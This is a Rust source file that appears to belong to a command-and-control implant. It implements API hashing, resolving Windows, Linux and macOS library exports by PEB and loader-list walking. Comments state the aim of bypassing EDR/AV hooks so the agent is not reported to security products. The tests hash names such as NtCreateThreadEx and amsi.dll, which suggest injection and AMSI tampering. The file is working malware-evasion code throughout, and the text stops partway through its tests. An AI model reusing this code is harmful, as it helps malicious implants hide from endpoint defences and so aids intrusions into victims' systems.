//! PE export resolution via API hashing.
//!
//! This crate provides functions to resolve DLL module bases and exported
//! function addresses by hash rather than by name string. This avoids
//! calling `LoadLibrary` / `GetProcAddress` directly, which are commonly
//! hooked by EDR/AV products.
//!
//! # Hashing Algorithm
//!
//! The hash function rotates a 32-bit seed right by 13 bits and XORs in
//! each byte of the name (case-folded to lowercase). The seed value is
//! generated at build time by `build.rs` and stored in `api_hashes.rs`.
//!
//! # Platform Support
//!
//! - **Windows x86_64**: Full PEB walking + PE export table parsing
//! - **Windows aarch64**: Full PEB walking + PE export table parsing
//! - **Non-Windows**: Stub implementations that return `None`

#![allow(dead_code)]
#![cfg_attr(not(test), no_std)]

include!(concat!(env!("OUT_DIR"), "/api_hashes.rs"));

/// Compute a case-insensitive rotational hash of a UTF-8 byte string.
///
/// Used for hashing DLL export names. The hash is computed by rotating
/// the accumulator right by 13 bits and XORing in each byte (lowercased).
/// A null terminator (`0x00`) ends the hash.
///
/// # Example
///
/// ```ignore
/// let hash = hash_str(b"NtCreateThreadEx");
/// ```
#[inline(always)]
pub fn hash_str(bytes: &[u8]) -> u32 {
    let mut hash: u32 = SEED;
    for &b in bytes {
        if b == 0 {
            break;
        }
        hash = hash.rotate_right(13) ^ (b.to_ascii_lowercase() as u32);
    }
    hash
}

/// Compute a case-insensitive rotational hash of a UTF-16 wide string.
///
/// Used for hashing DLL module names from the PEB loader data. For ASCII
/// code units (high byte = 0) the hash is **identical** to [`hash_str`] on the
/// same bytes, ensuring that wide-string PEB entries match the build-time
/// hash constants generated from ASCII DLL names.
///
/// Non-ASCII code units (e.g. CJK) are folded in a single rotation+XOR step
/// using the raw u16 value, preserving all 16 bits rather than truncating to u8.
///
/// # Example
///
/// ```ignore
/// let hash = hash_wstr(&[b'N' as u16, b'T' as u16, b'D' as u16, b'L' as u16, b'L' as u16]);
/// ```
#[inline(always)]
pub fn hash_wstr(bytes: &[u16]) -> u32 {
    let mut hash: u32 = SEED;
    for &c in bytes {
        if c == 0 {
            break;
        }
        if c < 0x0100 {
            // ASCII-range: case-fold and hash as a single u32 to match hash_str.
            let folded = (c as u8).to_ascii_lowercase() as u32;
            hash = hash.rotate_right(13) ^ folded;
        } else {
            // Non-ASCII: hash the full u16 in two steps (lo, hi) so that all
            // 16 bits participate in the hash.  We do *not* case-fold non-ASCII
            // code units because Windows PEB BaseDllName entries preserve the
            // original case for non-ASCII characters.
            let lo = (c & 0xFF) as u32;
            let hi = ((c >> 8) & 0xFF) as u32;
            hash = hash.rotate_right(13) ^ lo;
            hash = hash.rotate_right(13) ^ hi;
        }
    }
    hash
}

#[inline(always)]
fn is_forwarder(func_rva: usize, export_dir_rva: usize, export_dir_size: usize) -> bool {
    func_rva >= export_dir_rva && func_rva < export_dir_rva.saturating_add(export_dir_size)
}

/// Maximum recursion depth for forwarded-export resolution.
/// Forwarder chains deeper than this are treated as circular/malicious and
/// resolution returns `None` instead of overflowing the stack.
const MAX_FORWARDER_DEPTH: u32 = 8;

#[cfg(target_os = "windows")]
unsafe fn resolve_forwarded_export(dll_base: usize, func_rva: usize, depth: u32) -> Option<usize> {
    if depth >= MAX_FORWARDER_DEPTH {
        return None;
    }
    const MAX_FORWARDER_STR_LEN: usize = 512;
    const MAX_MODULE_WIDE_LEN: usize = 260;

    let forwarder_ptr = (dll_base + func_rva) as *const u8;
    let mut forwarder_len = 0usize;
    while forwarder_len < MAX_FORWARDER_STR_LEN && *forwarder_ptr.add(forwarder_len) != 0 {
        forwarder_len += 1;
    }
    if forwarder_len == 0 || forwarder_len >= MAX_FORWARDER_STR_LEN {
        return None;
    }

    let forwarder = core::slice::from_raw_parts(forwarder_ptr, forwarder_len);
    let mut dot_index = None;
    for i in 0..forwarder_len {
        if forwarder[i] == b'.' {
            dot_index = Some(i);
            break;
        }
    }
    let dot = dot_index?;
    if dot == 0 || dot + 1 >= forwarder_len {
        return None;
    }

    let module_name = &forwarder[..dot];
    let function_name = &forwarder[dot + 1..];

    if module_name.len() >= MAX_MODULE_WIDE_LEN {
        return None;
    }

    let mut module_wide = [0u16; MAX_MODULE_WIDE_LEN];
    for i in 0..module_name.len() {
        module_wide[i] = module_name[i] as u16;
    }

    // Forwarder module names are typically extensionless (e.g. "NTDLL"),
    // while PEB BaseDllName entries include ".dll".
    let module_base = get_module_handle_by_hash(hash_wstr(&module_wide[..module_name.len()]))
        .or_else(|| {
            if module_name.len() + 4 >= MAX_MODULE_WIDE_LEN {
                return None;
            }
            module_wide[module_name.len()] = b'.' as u16;
            module_wide[module_name.len() + 1] = b'd' as u16;
            module_wide[module_name.len() + 2] = b'l' as u16;
            module_wide[module_name.len() + 3] = b'l' as u16;
            get_module_handle_by_hash(hash_wstr(&module_wide[..module_name.len() + 4]))
        })?;

    let function_hash = hash_str(function_name);
    _get_proc_address_by_hash_depth(module_base, function_hash, depth + 1)
}

/// Walk the Windows PEB loader list and return the base address of the module
/// whose name hashes to `target_hash` using [`hash_wstr`].
///
/// # Safety
///
/// Must only be called on Windows x86-64.  The function dereferences raw
/// pointers derived from the TEB (`gs:[0x30]`) and the PEB loader data
/// structure — these are valid for the lifetime of the process but are
/// inherently unsafe raw-pointer reads.
#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    use core::arch::asm;
    let teb: usize;
    asm!("mov {}, gs:[0x30]", out(reg) teb);
    let peb = *(teb as *const usize).add(12) as *const u8;
    let ldr = *(peb.add(0x18) as *const usize) as *const u8;
    let mut module_list = *(ldr.add(0x20) as *const usize) as *const u8;

    while !core::ptr::eq(module_list, ldr.add(0x20)) {
        // LDR_DATA_TABLE_ENTRY offsets when walking via InMemoryOrderLinks.Flink
        // (module_list points to InMemoryOrderLinks at struct +0x10):
        //   +0x20  DllBase
        //   +0x48  BaseDllName.Length (u16, byte count)
        //   +0x50  BaseDllName.Buffer (pointer to UTF-16)
        let base_dll_name_ptr = *(module_list.add(0x50) as *const usize) as *const u16;
        let base_dll_name_len = *(module_list.add(0x48) as *const u16) as usize / 2;

        if !base_dll_name_ptr.is_null() && base_dll_name_len > 0 {
            let slice = core::slice::from_raw_parts(base_dll_name_ptr, base_dll_name_len);
            if hash_wstr(slice) == target_hash {
                return Some(*(module_list.add(0x20) as *const usize));
            }
        }
        module_list = *(module_list as *const usize) as *const u8;
    }
    None
}

/// Walk the PE export directory at `dll_base` and return the address of the
/// export whose name hashes to `target_hash` using [`hash_str`].
///
/// # Safety
///
/// `dll_base` must be a valid, fully-mapped PE image base with a correct DOS
/// and NT header.  The export directory and all name/ordinal arrays must be
/// accessible and not mutated for the duration of the call.
#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    _get_proc_address_by_hash_depth(dll_base, target_hash, 0)
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn _get_proc_address_by_hash_depth(
    dll_base: usize,
    target_hash: u32,
    depth: u32,
) -> Option<usize> {
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }

    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    let signature = *(nt_headers as *const u32);
    if signature != 0x4550 {
        return None;
    }

    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = dll_base + export_dir_rva;
    let export_dir_size = *((export_dir + 0x14) as *const u32) as usize;
    let num_names = *((export_dir + 0x18) as *const u32);
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let rva_names = *((export_dir + 0x20) as *const u32) as usize;
    let rva_ords = *((export_dir + 0x24) as *const u32) as usize;

    // Read SizeOfImage from the PE optional header for post-resolution
    // address-range validation (guards against ordinal-based misresolution
    // after Windows updates that shift function RVAs).
    let size_of_image = *((opt_header + 0x38) as *const u32) as usize;

    let names = (dll_base + rva_names) as *const u32;
    let funcs = (dll_base + rva_funcs) as *const u32;
    let ords = (dll_base + rva_ords) as *const u16;

    for i in 0..num_names {
        let name_ptr = (dll_base + (*names.add(i as usize)) as usize) as *const u8;
        let mut name_len = 0;
        while *name_ptr.add(name_len) != 0 {
            name_len += 1;
        }

        let slice = core::slice::from_raw_parts(name_ptr, name_len);
        if hash_str(slice) == target_hash {
            let ord = *ords.add(i as usize) as usize;
            let func_rva = *funcs.add(ord) as usize;
            if is_forwarder(func_rva, export_dir_rva, export_dir_size) {
                return resolve_forwarded_export(dll_base, func_rva, depth);
            }
            // Validate resolved address falls within the module's VA range.
            // After Windows updates, ordinal tables can shift and a stale
            // hash match may resolve to the wrong RVA outside the image.
            if func_rva >= size_of_image {
                return None;
            }
            return Some(dll_base + func_rva);
        }
    }
    None
}

/// Linux x86_64: walk the dynamic linker's `r_debug` link_map chain.
///
/// Returns the load-bias (`l_addr`) of the first loaded object whose
/// basename hashes to `target_hash` with [`hash_str`].
///
/// # Safety
///
/// Reads from `_r_debug` and the link_map chain maintained by ld-linux.
/// Safe for any dynamically-linked executable.
#[cfg(all(target_arch = "x86_64", target_os = "linux"))]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    // r_debug layout (64-bit):
    //   +0  int r_version (4 bytes)
    //   +4  padding (4 bytes, implicit alignment)
    //   +8  struct link_map *r_map (8 bytes)
    #[repr(C)]
    struct RDebug {
        r_version: i32,
        _pad: u32,
        r_map: *const LinkMap,
    }
    // link_map layout (64-bit):
    //   +0  uintptr_t l_addr   – load bias
    //   +8  char      *l_name  – full path
    //   +16 ElfW(Dyn) *l_ld
    //   +24 struct link_map *l_next
    //   +32 struct link_map *l_prev
    #[repr(C)]
    struct LinkMap {
        l_addr: usize,
        l_name: *const u8,
        l_ld: *const u8,
        l_next: *const LinkMap,
        l_prev: *const LinkMap,
    }
    extern "C" {
        static _r_debug: RDebug;
    }
    let mut node = _r_debug.r_map;
    while !node.is_null() {
        let entry = &*node;
        if !entry.l_name.is_null() {
            let mut len = 0usize;
            while *entry.l_name.add(len) != 0 {
                len += 1;
            }
            let name_bytes = core::slice::from_raw_parts(entry.l_name, len);
            // Use the basename (last path component) for hashing.
            let basename = name_bytes
                .split(|&b| b == b'/')
                .next_back()
                .unwrap_or(name_bytes);
            if !basename.is_empty() && hash_str(basename) == target_hash {
                return Some(entry.l_addr);
            }
        }
        node = entry.l_next;
    }
    None
}

/// Linux x86_64: parse the ELF64 dynamic symbol table of a loaded shared
/// object to find an exported function whose name hashes to `target_hash`.
///
/// `dll_base` must be the load bias returned by [`get_module_handle_by_hash`]
/// (i.e., the `l_addr` from the `link_map` entry for that library).
///
/// # Safety
///
/// `dll_base` must point to a valid, fully-mapped ELF64 shared-object image.
#[cfg(all(target_arch = "x86_64", target_os = "linux"))]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    if dll_base == 0 {
        return None;
    }
    let base = dll_base as *const u8;

    // Verify ELF magic (\x7fELF).
    if *(base as *const u32) != 0x464C_457F {
        return None;
    }

    // Elf64_Ehdr offsets we need:
    //   +32  e_phoff     (u64) – file offset of program header table
    //   +54  e_phentsize (u16) – size of each program header entry
    //   +56  e_phnum     (u16) – number of program headers
    let e_phoff = *(base.add(32) as *const u64) as usize;
    let e_phentsize = *(base.add(54) as *const u16) as usize;
    let e_phnum = *(base.add(56) as *const u16) as usize;

    // Walk program headers to find PT_DYNAMIC (type 2).
    let mut dyn_start: usize = 0;
    for i in 0..e_phnum {
        let ph = base.add(e_phoff + i * e_phentsize);
        let p_type = *(ph as *const u32);
        if p_type == 2 {
            // Elf64_Phdr.p_vaddr is at offset +16; this is a VMA, so
            // actual in-memory address = dll_base + p_vaddr.
            let p_vaddr = *(ph.add(16) as *const u64) as usize;
            dyn_start = dll_base + p_vaddr;
            break;
        }
    }
    if dyn_start == 0 {
        return None;
    }

    // Parse the dynamic section for DT_SYMTAB (6), DT_STRTAB (5),
    // DT_HASH (4), and DT_SYMENT (11).
    // Elf64_Dyn: { i64 d_tag; u64 d_val/d_ptr } — 16 bytes each.
    //
    // IMPORTANT: For shared libraries and PIE executables, the d_ptr values
    // in DT_SYMTAB, DT_STRTAB, and DT_HASH are virtual addresses relative
    // to ELF base (load address 0 in the ELF file).  The actual in-memory
    // address = dll_base (l_addr / load bias) + d_ptr.
    let mut symtab: usize = 0;
    let mut strtab: usize = 0;
    let mut hash_addr: usize = 0;
    let mut syment: usize = 24; // sizeof(Elf64_Sym) default
    {
        let mut dyn_ptr = dyn_start as *const i64;
        loop {
            let tag = *dyn_ptr;
            let val = *(dyn_ptr.add(1)) as usize; // raw d_ptr (VMA in ELF address space)
            if tag == 0 {
                break; // DT_NULL
            }
            match tag {
                // d_ptr values are VMAs; add dll_base to get actual memory address.
                5 => strtab = dll_base + val,
                6 => symtab = dll_base + val,
                4 => hash_addr = dll_base + val,
                11 => syment = val, // DT_SYMENT is a scalar, not an address
                _ => {}
            }
            dyn_ptr = dyn_ptr.add(2); // advance 16 bytes
        }
    }
    if symtab == 0 || strtab == 0 {
        return None;
    }

    // Get symbol count from the SysV hash table: nchain (at offset +4) equals
    // the total number of symbols in DT_SYMTAB.
    let nsyms: usize = if hash_addr != 0 {
        *((hash_addr + 4) as *const u32) as usize
    } else {
        2048 // conservative upper bound when no hash table is present
    };

    // Walk Elf64_Sym entries.
    // Elf64_Sym layout:
    //   +0   u32 st_name  – index into string table
    //   +4   u8  st_info
    //   +5   u8  st_other
    //   +6   u16 st_shndx
    //   +8   u64 st_value – VMA within the ELF file (relative to ELF base = 0)
    //   +16  u64 st_size
    for i in 0..nsyms {
        let sym = (symtab + i * syment) as *const u8;
        let st_name = *(sym as *const u32) as usize;
        let st_value = *(sym.add(8) as *const u64) as usize;

        if st_value == 0 || st_name == 0 {
            continue;
        }

        let name_ptr = (strtab + st_name) as *const u8;
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 && len < 512 {
            len += 1;
        }
        if len == 0 {
            continue;
        }
        let name_bytes = core::slice::from_raw_parts(name_ptr, len);

        if hash_str(name_bytes) == target_hash {
            // st_value is a VMA relative to ELF base (0 for PIC), so
            // the actual in-memory address = load_bias + st_value.
            return Some(dll_base + st_value);
        }
    }
    None
}

/// macOS x86_64: enumerate dyld-loaded images to find a library whose
/// basename hashes to `target_hash`.  Returns the Mach-O header address
/// (i.e., the slide-adjusted image base).
///
/// # Safety
///
/// Calls dyld API functions (`_dyld_image_count`, `_dyld_get_image_header`,
/// `_dyld_get_image_name`) which are part of macOS's stable dyld SPI.
#[cfg(all(target_arch = "x86_64", target_os = "macos"))]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    extern "C" {
        fn _dyld_image_count() -> u32;
        fn _dyld_get_image_header(image_index: u32) -> *const u8;
        fn _dyld_get_image_name(image_index: u32) -> *const u8;
    }
    let count = _dyld_image_count();
    for i in 0..count {
        let name_ptr = _dyld_get_image_name(i);
        if name_ptr.is_null() {
            continue;
        }
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let name_bytes = core::slice::from_raw_parts(name_ptr, len);
        let basename = name_bytes
            .split(|&b| b == b'/')
            .last()
            .unwrap_or(name_bytes);
        if !basename.is_empty() && hash_str(basename) == target_hash {
            let header = _dyld_get_image_header(i);
            if !header.is_null() {
                return Some(header as usize);
            }
        }
    }
    None
}

/// macOS x86_64: walk the Mach-O LC_SYMTAB symbol table of a loaded image
/// to resolve a function whose name hashes to `target_hash`.
///
/// `dll_base` must be the Mach-O header address returned by
/// [`get_module_handle_by_hash`].
///
/// # Safety
///
/// `dll_base` must point to a valid, fully-mapped Mach-O 64-bit image.
#[cfg(all(target_arch = "x86_64", target_os = "macos"))]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    if dll_base == 0 {
        return None;
    }
    let base = dll_base as *const u8;

    // mach_header_64: magic(u32)+cputype(i32)+cpusubtype(i32)+filetype(u32)+
    //                 ncmds(u32)+sizeofcmds(u32)+flags(u32)+reserved(u32) = 32 bytes
    const MH_MAGIC_64: u32 = 0xFEED_FACF;
    if *(base as *const u32) != MH_MAGIC_64 {
        return None;
    }
    let ncmds = *(base.add(16) as *const u32) as usize;

    // Walk load commands to find LC_SEGMENT_64 (__TEXT, __LINKEDIT) and
    // LC_SYMTAB.
    let mut text_vmaddr: usize = usize::MAX;
    let mut linkedit_vmaddr: usize = 0;
    let mut linkedit_fileoff: usize = 0;
    let mut symoff: usize = 0;
    let mut nsyms: usize = 0;
    let mut stroff: usize = 0;

    let mut cmd_ptr = base.add(32); // sizeof(mach_header_64)
    for _ in 0..ncmds {
        let cmd = *(cmd_ptr as *const u32);
        let cmdsize = *(cmd_ptr.add(4) as *const u32) as usize;
        if cmdsize < 8 {
            break; // malformed
        }
        match cmd {
            0x19 => {
                // LC_SEGMENT_64
                // segment_command_64: cmd(4)+cmdsize(4)+segname(16)+
                //   vmaddr(8)+vmsize(8)+fileoff(8)+filesize(8)+...
                let segname = core::slice::from_raw_parts(cmd_ptr.add(8), 16);
                let vmaddr = *(cmd_ptr.add(24) as *const u64) as usize;
                let fileoff = *(cmd_ptr.add(40) as *const u64) as usize;
                if segname.starts_with(b"__TEXT\0") {
                    text_vmaddr = vmaddr;
                } else if segname.starts_with(b"__LINKEDIT\0") {
                    linkedit_vmaddr = vmaddr;
                    linkedit_fileoff = fileoff;
                }
            }
            0x02 => {
                // LC_SYMTAB
                // symtab_command: cmd(4)+cmdsize(4)+symoff(4)+nsyms(4)+stroff(4)+strsize(4)
                symoff = *(cmd_ptr.add(8) as *const u32) as usize;
                nsyms = *(cmd_ptr.add(12) as *const u32) as usize;
                stroff = *(cmd_ptr.add(16) as *const u32) as usize;
            }
            _ => {}
        }
        cmd_ptr = cmd_ptr.add(cmdsize);
    }

    if text_vmaddr == usize::MAX || symoff == 0 || nsyms == 0 || linkedit_vmaddr == 0 {
        return None;
    }

    // Compute ASLR slide: actual mach_header address minus preferred __TEXT vmaddr.
    let slide = dll_base.wrapping_sub(text_vmaddr);

    // Symbol table and string table are in __LINKEDIT.
    // in_memory = linkedit_vmaddr + slide + (fileoff - linkedit_fileoff)
    let symtab_addr = linkedit_vmaddr
        .wrapping_add(slide)
        .wrapping_add(symoff)
        .wrapping_sub(linkedit_fileoff);
    let strtab_addr = linkedit_vmaddr
        .wrapping_add(slide)
        .wrapping_add(stroff)
        .wrapping_sub(linkedit_fileoff);

    // Walk nlist_64 entries (16 bytes each):
    //   +0  u32 n_strx – string table index
    //   +4  u8  n_type
    //   +5  u8  n_sect
    //   +6  u16 n_desc
    //   +8  u64 n_value – symbol address (file VA; add slide for in-memory)
    const NLIST64_SIZE: usize = 16;
    const N_TYPE_MASK: u8 = 0x0E;
    const N_SECT: u8 = 0x0E; // defined in a section (not undefined / common)

    for i in 0..nsyms {
        let sym = (symtab_addr + i * NLIST64_SIZE) as *const u8;
        let n_strx = *(sym as *const u32) as usize;
        let n_type = *sym.add(4);
        let n_value = *(sym.add(8) as *const u64) as usize;

        if n_value == 0 || n_strx == 0 {
            continue;
        }
        // Skip undefined / absolute symbols; only resolve section-defined exports.
        if (n_type & N_TYPE_MASK) != N_SECT {
            continue;
        }

        let name_ptr = (strtab_addr + n_strx) as *const u8;
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 && len < 512 {
            len += 1;
        }
        if len == 0 {
            continue;
        }
        let name_bytes = core::slice::from_raw_parts(name_ptr, len);

        // Mach-O symbol names are prefixed with '_'; try both forms.
        let stripped = if name_bytes.first() == Some(&b'_') {
            &name_bytes[1..]
        } else {
            name_bytes
        };
        if hash_str(stripped) == target_hash || hash_str(name_bytes) == target_hash {
            // n_value is the preferred VMA; add slide for the actual address.
            return Some(slide.wrapping_add(n_value));
        }
    }
    None
}

/// Fallback stub for non-Windows x86_64 platforms other than Linux and macOS.
///
/// # Safety
///
/// Always returns `None`.
#[cfg(all(
    target_arch = "x86_64",
    not(target_os = "windows"),
    not(target_os = "linux"),
    not(target_os = "macos")
))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

/// Fallback stub for non-Windows x86_64 platforms other than Linux and macOS.
///
/// # Safety
///
/// Always returns `None`.
#[cfg(all(
    target_arch = "x86_64",
    not(target_os = "windows"),
    not(target_os = "linux"),
    not(target_os = "macos")
))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}

/// aarch64 Windows: PEB is at TPIDR_EL0 + 0x60 (same TEB layout as x86_64).
/// The LDR module-list walk is identical to the x86_64 path; only the
/// register used to reach the TEB differs (`mrs tpidr_el0` instead of
/// `mov gs:[0x30]`).
#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    use core::arch::asm;
    let teb: usize;
    // On aarch64 Windows the TEB pointer is stored in TPIDR_EL0.
    asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
    // TEB+0x60 → PEB pointer (same offset as x86_64).
    let peb = *(teb as *const usize).add(12) as *const u8; // offset 0x60 / 8 = 12
    let ldr = *(peb.add(0x18) as *const usize) as *const u8;
    let mut module_list = *(ldr.add(0x20) as *const usize) as *const u8;

    while module_list as usize != ldr.add(0x20) as usize {
        // LDR_DATA_TABLE_ENTRY offsets when walking via InMemoryOrderLinks.Flink
        // (module_list points to InMemoryOrderLinks at struct +0x10):
        //   +0x20  DllBase
        //   +0x48  BaseDllName.Length (u16, byte count)
        //   +0x50  BaseDllName.Buffer (pointer to UTF-16)
        let base_dll_name_ptr = *(module_list.add(0x50) as *const usize) as *const u16;
        let base_dll_name_len = *(module_list.add(0x48) as *const u16) as usize / 2;

        if !base_dll_name_ptr.is_null() && base_dll_name_len > 0 {
            let slice = core::slice::from_raw_parts(base_dll_name_ptr, base_dll_name_len);
            if hash_wstr(slice) == target_hash {
                return Some(*(module_list.add(0x20) as *const usize));
            }
        }
        module_list = *(module_list as *const usize) as *const u8;
    }
    None
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    _get_proc_address_by_hash_depth(dll_base, target_hash, 0)
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
unsafe fn _get_proc_address_by_hash_depth(
    dll_base: usize,
    target_hash: u32,
    depth: u32,
) -> Option<usize> {
    // Export directory parsing is identical to x86_64: PE32+ format is the
    // same for both architectures; only the machine type in FileHeader differs.
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }

    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    if *(nt_headers as *const u32) != 0x4550 {
        return None;
    }

    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = dll_base + export_dir_rva;
    let export_dir_size = *((export_dir + 0x14) as *const u32) as usize;
    let num_names = *((export_dir + 0x18) as *const u32);
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let rva_names = *((export_dir + 0x20) as *const u32) as usize;
    let rva_ords = *((export_dir + 0x24) as *const u32) as usize;

    // Read SizeOfImage from the PE optional header for post-resolution
    // address-range validation (guards against ordinal-based misresolution
    // after Windows updates that shift function RVAs).
    let size_of_image = *((opt_header + 0x38) as *const u32) as usize;

    let names = (dll_base + rva_names) as *const u32;
    let funcs = (dll_base + rva_funcs) as *const u32;
    let ords = (dll_base + rva_ords) as *const u16;

    for i in 0..num_names {
        let name_ptr = (dll_base + (*names.add(i as usize)) as usize) as *const u8;
        let mut name_len = 0usize;
        while *name_ptr.add(name_len) != 0 {
            name_len += 1;
        }

        let slice = core::slice::from_raw_parts(name_ptr, name_len);
        if hash_str(slice) == target_hash {
            let ord = *ords.add(i as usize) as usize;
            let func_rva = *funcs.add(ord) as usize;
            if is_forwarder(func_rva, export_dir_rva, export_dir_size) {
                return resolve_forwarded_export(dll_base, func_rva, depth);
            }
            // Validate resolved address falls within the module's VA range.
            if func_rva >= size_of_image {
                return None;
            }
            return Some(dll_base + func_rva);
        }
    }
    None
}

/// aarch64 Linux: no PEB equivalent.  Use dl_iterate_phdr via a
/// platform-specific out-of-crate call.  Returning None here keeps the
/// `no_std` constraint; callers that need module handles on aarch64 Linux
/// should use `dlopen`/`dlsym` directly from agent code.
#[cfg(all(target_arch = "aarch64", not(target_os = "windows")))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

#[cfg(all(target_arch = "aarch64", not(target_os = "windows")))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}

// ── close_handle: NtClose via PEB walk (M-25 fix) ──────────────────────────
//
// Closes a kernel handle using NtClose resolved through the PEB walker so the
// call does not appear in the module's IAT and is not subject to user-space
// hooks installed by EDR products on `kernel32!CloseHandle`.
//
// If NtClose cannot be resolved (e.g. ntdll missing from PEB on a stripped
// process), the function silently returns and the handle is leaked.  This is
// preferable to falling back to the hooked CloseHandle in a C2 agent: a
// leaked handle is a process-lifetime resource at worst, whereas a hooked
// API call may report the agent to a security product.

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
pub unsafe fn close_handle(handle: *mut core::ffi::c_void) {
    use core::sync::atomic::{AtomicUsize, Ordering};
    static NT_CLOSE_ADDR: AtomicUsize = AtomicUsize::new(0);
    let addr = NT_CLOSE_ADDR.load(Ordering::Relaxed);
    let resolved = if addr != 0 {
        addr
    } else {
        let ntdll = get_module_handle_by_hash(HASH_NTDLL_DLL).unwrap_or(0);
        let a = if ntdll != 0 {
            get_proc_address_by_hash(ntdll, HASH_NTCLOSE).unwrap_or(0)
        } else {
            0
        };
        if a != 0 {
            NT_CLOSE_ADDR.store(a, Ordering::Relaxed);
        }
        a
    };
    if resolved != 0 {
        type NtCloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let nt_close: NtCloseFn = core::mem::transmute(resolved as *const ());
        nt_close(handle);
    }
}

/// No-op stub for non-Windows targets.
///
/// # Safety
///
/// Safe to call on non-Windows targets (no-op immediately).
#[cfg(all(target_arch = "x86_64", not(target_os = "windows")))]
pub unsafe fn close_handle(_handle: *mut core::ffi::c_void) {
    // No-op on non-Windows targets; CloseHandle is a Windows-only concept.
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn close_handle(handle: *mut core::ffi::c_void) {
    use core::sync::atomic::{AtomicUsize, Ordering};
    static NT_CLOSE_ADDR: AtomicUsize = AtomicUsize::new(0);
    let addr = NT_CLOSE_ADDR.load(Ordering::Relaxed);
    let resolved = if addr != 0 {
        addr
    } else {
        let ntdll = get_module_handle_by_hash(HASH_NTDLL_DLL).unwrap_or(0);
        let a = if ntdll != 0 {
            get_proc_address_by_hash(ntdll, HASH_NTCLOSE).unwrap_or(0)
        } else {
            0
        };
        if a != 0 {
            NT_CLOSE_ADDR.store(a, Ordering::Relaxed);
        }
        a
    };
    if resolved != 0 {
        type NtCloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let nt_close: NtCloseFn = core::mem::transmute(resolved as *const ());
        nt_close(handle);
    }
}

#[cfg(not(any(
    all(target_arch = "x86_64", target_os = "windows"),
    all(target_arch = "x86_64", not(target_os = "windows")),
    all(target_arch = "aarch64", target_os = "windows")
)))]
pub unsafe fn close_handle(_handle: *mut core::ffi::c_void) {
    // No-op on non-Windows targets; CloseHandle is a Windows-only concept.
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── hash_str ────────────────────────────────────────────────────────

    #[test]
    fn hash_str_deterministic() {
        let h1 = hash_str(b"NtCreateThreadEx");
        let h2 = hash_str(b"NtCreateThreadEx");
        assert_eq!(h1, h2);
    }

    #[test]
    fn hash_str_case_insensitive() {
        let upper = hash_str(b"NTDLL.DLL");
        let lower = hash_str(b"ntdll.dll");
        let mixed = hash_str(b"Ntdll.Dll");
        assert_eq!(upper, lower);
        assert_eq!(upper, mixed);
    }

    #[test]
    fn hash_str_different_names() {
        let h1 = hash_str(b"NtCreateThreadEx");
        let h2 = hash_str(b"NtClose");
        assert_ne!(h1, h2);
    }

    #[test]
    fn hash_str_null_terminator_stops() {
        let h1 = hash_str(b"NtClose\x00extra");
        let h2 = hash_str(b"NtClose");
        assert_eq!(h1, h2, "null byte should terminate hashing");
    }

    #[test]
    fn hash_str_empty() {
        // Hash of empty string should just be the seed.
        let h = hash_str(b"");
        assert_eq!(h, SEED);
    }

    #[test]
    fn hash_str_single_byte() {
        let h = hash_str(b"A");
        let expected = SEED.rotate_right(13) ^ (b'a' as u32);
        assert_eq!(h, expected);
    }

    #[test]
    fn hash_str_matches_build_time_hashes() {
        // Verify runtime hash_str matches the build-time generated constants.
        assert_eq!(hash_str(b"NtCreateThreadEx"), HASH_NTCREATETHREADEX);
        assert_eq!(hash_str(b"NtClose"), HASH_NTCLOSE);
        assert_eq!(hash_str(b"ntdll.dll"), HASH_NTDLL_DLL);
        assert_eq!(hash_str(b"amsi.dll"), HASH_AMSI_DLL);
